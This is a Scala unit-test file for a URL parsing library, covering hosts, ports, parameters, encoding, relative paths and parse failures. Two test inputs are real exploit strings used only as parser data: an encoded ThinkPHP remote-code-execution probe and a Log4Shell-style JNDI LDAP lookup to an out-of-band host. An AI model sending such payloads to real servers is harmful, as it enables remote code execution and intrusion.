package spec

import org.scalatest.matchers.should.Matchers
import org.scalatest.wordspec.AnyWordSpec
import spice.net._

class URLSpec extends AnyWordSpec with Matchers {
  "URL" when {
    "parsing" should {
      "properly parse a simple URL" in {
        val url = URL.parse("https://www.outr.com")
        url.host should be("www.outr.com")
        url.protocol should be(Protocol.Https)
        url.path.encoded should be("")
        url.port should be(443)
      }
      "properly parse a URL with GET params" in {
        val url = URL.parse("https://somewhere.com?foo.one=1&foo.two=2")
        url.host should be("somewhere.com")
        url.protocol should be(Protocol.Https)
        url.path.encoded should be("")
        url.port should be(443)
        url.parameters.value("foo.one") should be(Some("1"))
        url.parameters.value("foo.two") should be(Some("2"))
      }
      "properly parse an IP address with a ? on the end" in {
        val url = URL.parse("http://192.168.1.1:8080/?")
        url.host should be("192.168.1.1")
        url.port should be(8080)
        url.parameters.map should be(Map.empty)
      }
      "property parse an IPv6 url" in {
        val url = URL.parse("http://0:0:0:0:0:0:0:0:8080/")
        url.host should be("0:0:0:0:0:0:0:0")
        url.port should be(8080)
      }
      "quick fail parsing a non-URL" in {
        URL.get("test") should be(Left(URLParseFailure("test is not a valid URL", URLParseFailure.QuickFail)))
      }
      "fail to parse an email address" in {
        URL.get("test@spice.io") should be(Left(URLParseFailure("test@spice.io appears to be an email address", URLParseFailure.EmailAddress)))
      }
      "fail to parse 'it...'" in {
        URL.get("it...") should be(Left(URLParseFailure("it... is not a valid URL", URLParseFailure.QuickFail)))
      }
      "fail to parse 'it.'" in {
        URL.get("it.") should be(Left(URLParseFailure("it. is not a valid URL", URLParseFailure.QuickFail)))
      }
      "fail to parse ':smile'" in {
        URL.get(":smile") should be(Left(URLParseFailure(":smile is not a valid URL", URLParseFailure.QuickFail)))
      }
      "test" in {
        URL.get("https://app.courio.com/?stream=%2BKNrsnsMRtkw0nkZUuS3PR2hAEccwnDTA&public=true") should be(Right(URL.parse("https://app.courio.com/?stream=%2BKNrsnsMRtkw0nkZUuS3PR2hAEccwnDTA&public=true")))
      }
      "properly parse a simple URL with key-only param" in {
        val url = URL.parse("http://www.outr.com/test?wsdl")
        url.parameters.encoded should be("?wsdl")
      }
      "properly parse a simple HTTPS URL" in {
        val url = URL.parse("https://techcrunch.com/2019/10/13/ban-facebook-campaign-ads?utm_medium=TCnewsletter&tpcc=TCdailynewsletter")
        url.toString should be("https://techcrunch.com/2019/10/13/ban-facebook-campaign-ads?utm_medium=TCnewsletter&tpcc=TCdailynewsletter")
      }
      "properly parse a simple file URL" in {
        val url = URL.parse("file:///android_asset/www/app/test.js")
        url.host should be("")
        url.path.encoded should be("/android_asset/www/app/test.js")
        url.toString should be("file:///android_asset/www/app/test.js")
      }
      //      "properly parse a UK domain" in {
      //        val url = URL("https://google.co.uk")
      //        url.tld should be(Some("co.uk"))
      //      }
      "properly parse a URL without the protocol defined" in {
        val url = URL.parse("//cdn.framework7.io/i/share-banner.jpg")
        url.toString should be("https://cdn.framework7.io/i/share-banner.jpg")
      }
      "properly parse a URL with just the domain name" in {
        val url = URL.parse("outr.com")
        url.toString should be("https://outr.com")
      }
      "properly parse a fairly long URL" in {
        val url = URL.parse("https://www.spice.io/testing/1/favicon-32x32.png?arg1=true&v=0.7.0-1586440828356")
        url.toString should be("https://www.spice.io/testing/1/favicon-32x32.png?arg1=true&v=0.7.0-1586440828356")
      }
      "properly detect an invalid TLD" in {
        val url = URL.get("event.which")
        url should be(Left(URLParseFailure(s"Invalid top-level domain: [which] for supplied URL: [event.which]", URLParseFailure.InvalidTopLevelDomain)))
      }
      "properly unapply from a String" in {
        "http://spice.io" match {
          case URL(url) => url.domain should be("spice.io")
          case _ => fail("unapply did not match")
        }
      }
      "properly parse a URL with two for the same key" in {
        val url = URL.parse("http://www.outr.com/test?test=one&test=two")
        url.paramList("test") should be(List("one", "two"))
        url.domain should be("outr.com")
      }
      "properly parse a URL with some crazy characters" in {
        val url = URL.parse("http://127.0.0.1/elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50")
        url.decoded.toString should be("http://127.0.0.1/elrekt.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP")
        url.domain should be("127.0.0.1")
      }
      "properly encode a URL with a pipe" in {
        val url = URL.parse("http://spice.io").withParam("testing", "one|two")
        url.encoded.toString should be("http://spice.io?testing=one%7Ctwo")
      }
      "properly parse a relative URL" in {
        val url = URL.parse("http://www.outr.com/examples/../images/test.png")
        url.path.encoded should be("/images/test.png")
      }
      "properly parse a relative URL with invalid higher level" in {
        val url = URL.parse("http://www.outr.com/../images/test.png")
        url.path.encoded should be("/images/test.png")
      }
      "properly parse a relative URL with multiple higher levels" in {
        val url = URL.parse("http://www.outr.com/examples/testing/../../images/../test.png")
        url.path.encoded should be("/test.png")
      }
      "apply a relative URL to an existing URL" in {
        val url = URL.parse("http://www.outr.com/examples/otherstuff/test.html")
        val updated = url.withPath("../../images/test.png")
        updated.path.encoded should be("/images/test.png")
      }
      "apply an absolute path to an existing path" in {
        val url = URL.parse("http://www.outr.com/examples/otherstuff/test.html")
        val updated = url.withPath("/absolute.html")
        updated.path.encoded should be("/absolute.html")
      }
      "apply a full part to an existing URL" in {
        val url = URL.parse("https://imgur.com/a/xSXO7pF")
        val updated = url.withPart("//s.imgur.com/images/favicon-32x32.png")
        updated.toString should be("https://s.imgur.com/images/favicon-32x32.png")
      }
      "apply a relative path as a part to an existing URL" in {
        val url = URL.parse("https://www.outr.com")
        val updated = url.withPart("images/favicon.png")
        updated.toString should be("https://www.outr.com/images/favicon.png")
      }
      "properly parse an extremely long URL and spit it back syntactically equal" in {
        val s = "http://www.a.com.qa/pps/a/publish/Pages/System Pages/Document View Page?com.a.b.pagesvc.renderParams.sub-53343f7a_1279673d2a9_-78af0a000136=rp.currentDocumentID=-4591476d_14a4cb0cbbf_-6cb00a000121&"
        val url = URL.parse(s)
        url.protocol should be(Protocol.Http)
        url.host should be("www.a.com.qa")
        url.path.encoded should be("/pps/a/publish/Pages/System%20Pages/Document%20View%20Page")
        url.parameters.value("com.a.b.pagesvc.renderParams.sub-53343f7a_1279673d2a9_-78af0a000136") should be(Some("rp.currentDocumentID=-4591476d_14a4cb0cbbf_-6cb00a000121"))
      }
      "properly create a decoded URL and encode it" in {
        val url = URL.parse("http://test.com/location").withParam("address", "Oklahoma City, OK")
        url.toString should be("http://test.com/location?address=Oklahoma%20City%2C%20OK")
        url.parameters.value("address") should be(Some("Oklahoma City, OK"))
        val encoded = url.encoded.toString
        encoded should be("http://test.com/location?address=Oklahoma%20City%2C%20OK")
      }
      "properly parse a URL with an encoded path and decode it" in {
        val url = URL.parse("https://test.com/d/_VomiVDa---/s9knzlc2k/Matt%202007.jpg")
        url.path.decoded should be("/d/_VomiVDa---/s9knzlc2k/Matt 2007.jpg")
      }
      "properly parse a URL with a +" in {
        val url = URL.parse("https://test.com/a+b+c")
        url.path.decoded should be("/a+b+c")
        url.path.encoded should be("/a+b+c")
        url.toString should be("https://test.com/a+b+c")
      }
      "properly parse a URL with regex interference" in {
        val url = URL.parse("http://www.booktxt.net.a.bdydns.com/druid/coordinator/v1/lookups/config/%24{jndi{ldap%3A%2F%2Fcn0hgotl5b3uorb5hkqg18fn868ou7bdy.oast.me%2Ftea}}")
        url.host should be("www.booktxt.net.a.bdydns.com")
      }
      "properly interpolate a URL" in {
        val url = url"http://www.spice.io"
        url.encoded.toString should be("http://www.spice.io")
        url.protocol should be(Protocol.Http)
        url.host should be("www.spice.io")
        url.path.toString should be("")
        url.parameters should be(Parameters.empty)
      }
      "properly parse a URL with IPv6" in {
        val url = URL.parse("https://0:0:0:0:0:0:0:0:8080")
        url.toString should be("https://0:0:0:0:0:0:0:0:8080")
      }
      "properly parse a URL with a colon" in {
        val url = URL.parse("https://user1:detail@example.com/more/complex")
        url.toString should be("https://user1:detail@example.com/more/complex")
      }
      "fail to parse an invalid URL" in {
        val result = URL.get("http:www:spice:io")
        result should be(Left(URLParseFailure("Invalid host: http:www:spice:io", URLParseFailure.InvalidHost)))
      }
      "fail to compile when interpolating a URL with a param" in {
        assertDoesNotCompile(
          """
            |val path = "wahoo"
            |url"http://www.spice.io/$path"
          """.stripMargin)
      }
      "fail to compile an invalid URL" in {
        assertDoesNotCompile("""url"http:www:spice:io"""")
      }
    }
    "applying parts" should {
      val url = URL.parse("http://www.spice.io/testing/1/test.html?arg1=true")

      "replace one URL with another" in {
        url.withPart("http://google.com") should be(URL.parse("http://google.com"))
      }
      "replace the path" in {
        url.withPart("/index.html") should be(URL.parse("http://www.spice.io/index.html"))
      }
      "replace params" in {
        url.withPart("?wahoo=true") should be(URL.parse("http://www.spice.io/testing/1/test.html?wahoo=true"))
      }
      "replace the path and params" in {
        url.withPart("/index.html?wahoo=true") should be(URL.parse("http://www.spice.io/index.html?arg1=true&wahoo=true"))
      }
      "apply relative path" in {
        url.withPart("../2/test.html") should be(URL.parse("http://www.spice.io/testing/2/test.html"))
      }
      "apply a new path without forward-slash" in {
        url.withPart("favicon-32x32.png?v=0.7.0-1586440828356") should be(URL.parse("http://www.spice.io/testing/1/favicon-32x32.png?arg1=true&v=0.7.0-1586440828356"))
      }
    }
    "encoding to path" should {
      "apply a complete path properly" in {
        val url = URL.parse("https://cdnjs.cloudflare.com/ajax/libs/pixi.js/4.5.0/pixi.min.js")
        url.asPath() should be("/cdnjs.cloudflare.com/ajax/libs/pixi.js/4.5.0/pixi.min.js")
      }
      "apply a complete path with port properly" in {
        val url = URL.parse("https://cdnjs.cloudflare.com/ajax/libs/pixi.js/4.5.0/pixi.min.js")
        url.asPath(includePort = true) should be("/cdnjs.cloudflare.com/443/ajax/libs/pixi.js/4.5.0/pixi.min.js")
      }
      "should handle commas" in {
        val url = URL.parse("https://api.mapbox.com/styles/v1/mapbox/streets-v12/static/-122.256654%2C37.804077%2C13/500x300")
        url.toString should be("https://api.mapbox.com/styles/v1/mapbox/streets-v12/static/-122.256654%2C37.804077%2C13/500x300")
      }
      "use a URL with a colon in the path" in {
        val url = URL.parse("https://places.googleapis.com/v1/places:searchText")
        url.toString should be("https://places.googleapis.com/v1/places:searchText")
      }
    }
  }
}

